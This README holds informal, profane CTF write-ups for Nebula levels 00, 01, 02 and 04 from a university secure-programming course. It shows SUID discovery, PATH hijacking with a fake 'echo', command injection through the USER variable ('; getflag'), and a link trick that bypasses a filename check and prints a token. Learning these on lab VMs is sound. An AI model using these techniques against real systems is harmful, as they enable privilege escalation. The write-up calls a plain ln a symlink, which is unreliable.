# SECPROG-Unisa
Solutions for Nebula and Protostar CTFs for the Secure Programming course of the Master's Degree in Cybersecurity of Unisa.

This repository aims to provide straightforward and simple explanations on how to solve Nebula and Protostar CTFs shown during the Secure Programming Course of the Master's Degree in Cybersecurity of Unisa.

Beware: I'm really informal here, and I'm not interested in sounding professional. If you're sensible to slurs, slangs and shit, just go away and study somewhere else. If you are an HR, this is not my CV. Take this file as a "friendly yapping about CTFs".

In this course, these CTFs were solved:
- nebula-level00;
- nebula-level01;
- nebula-level02;
- nebula-level04;
- nebula-level07;
- nebula-level10;
- nebula-level13;
- protostar-stack0;
- protostar-stack1;
- protostar-stack2;
- protostar-stack3;
- protostar-stack4;
- protostar-stack5;

## NEBULA

### Level 00

This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

Alternatively, look at the find man page.

To access this level, log in as level00 with the password of level00.

So let's log in as level00. We can use `find` with the right parameters to search for an SUID executable.

```
level00@nebula:~$ find / -perm /u+s 2>/dev/null
/bin/.../flag00
...
```

The `/bin/.../flag00` executable looks suspicious. Let's try executing it.

```
level00@nebula:~$ /bin/.../flag00 
Congrats, now run getflag to get your flag!
```

Gotcha! Now we just have to run `/bin/getflag`.

```
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

Success.

## Level 01

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

Let's log in as level01. We'll check what's inside `/home/flag01`.

```
level01@nebula:~$ cd /home/flag01
level01@nebula:/home/flag01$ ls -la
total 13
...
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
...
```

We have an SUID executable! Let's try running it.

```
level01@nebula:/home/flag01$ ./flag01 
and now what?
```

Nothing happens.

Examining the source code we can find something interesting.

```
system("/usr/bin/env echo and now what?");
```

Let's perform a quick `man system`.

"system()  executes  a  command specified in command by calling /bin/sh -c command, and returns after the command has  been  completed."

We also find an interesting bit into the NOTES section:

"Do  not  use  system()  from  a  program  with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert  system integrity."

So what environment variable can we use to get freaky?

Actually, when you use a command without giving the full path of the executable, the `PATH` variable is used to search for such command in these paths.

In our program the `echo` command is called in such way.

To win this level the solution is pretty straightforward:
1. Copy `/bin/getflag` into a temporary directory as "echo" (i.e. `/tmp/echo`);
2. Add `/tmp/` as first directory into the `PATH` variable;
3. Run `./flag01` with the updated `PATH` and the fake `echo`.

Let's do this:
```
level01@nebula:/home/flag01$ cp /bin/getflag /tmp/echo
level01@nebula:/home/flag01$ PATH=/tmp/:${PATH} ./flag01 
You have successfully executed getflag on a target account
```

Success.

## Level 02

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

Let's log in as level02 and launch the `/home/flag02/flag02` executable.

```
level02@nebula:~$ /home/flag02/flag02 
about to call system("/bin/echo level02 is cool")
level02 is cool
```

The program uses the system to launch a command that is prepared using a buffer.

The command is `/bin/echo USER is cool` where `USER` is the content of the `USER` environment variable.

We can't leverage the solution of Level 01 because `echo` is called using its absolute path, but we can do something else.

We can modify the `USER` environment variable making it `; getflag`. This way the `system` will call `getflag`.

Let's try it:

```
level02@nebula:~$ USER="; getflag" /home/flag02/flag02 
about to call system("/bin/echo ; getflag is cool")

You have successfully executed getflag on a target account
```

Success.

## Level 04
This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

First thing first, let's log in as level04 and check the content of `/home/flag04/flag04`:

```
level04@nebula:/home/flag04$ ls -la
total 13
...
-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
...
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
```

We have the `flag04` executable and the `token` file, which is our target.

We don't have the perms needed to read the file, but we can try to read it using `flag04`:

```
level04@nebula:/home/flag04$ ./flag04 token 
You may not access 'token'
```

We got an error. Analyzing the source code, we can't read the file because its name contains "token". We can't even copy it because we don't have the perms to do so.

Let's read the manual of `open`:

"Given  a  pathname  for a file, open() returns a file descriptor".

No shit Sherlock. But actually that's a fair point, because if we read further:

"**O_NOFOLLOW** If pathname is a symbolic link, then the open fails".

Our `open` does not use the `O_NONFOLLOW` option, does that mean we can open a symlink?

Let's create a link to the `token` file and let's use it as argument for `./flag04`:

```
level04@nebula:/home/flag04$ ln token /home/level04/tkn
level04@nebula:/home/flag04$ ./flag04 /home/level04/tkn 
06508b5e-8909-4f38-b630-fdb148a848a2
```

Now we can use this token to log in as flag04 and win the CTF:

```
level04@nebula:/home/flag04$ ssh flag04@localhost
...
flag04@localhost's password: 06508b5e-8909-4f38-b630-fdb148a848a2
...
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
```

Success.
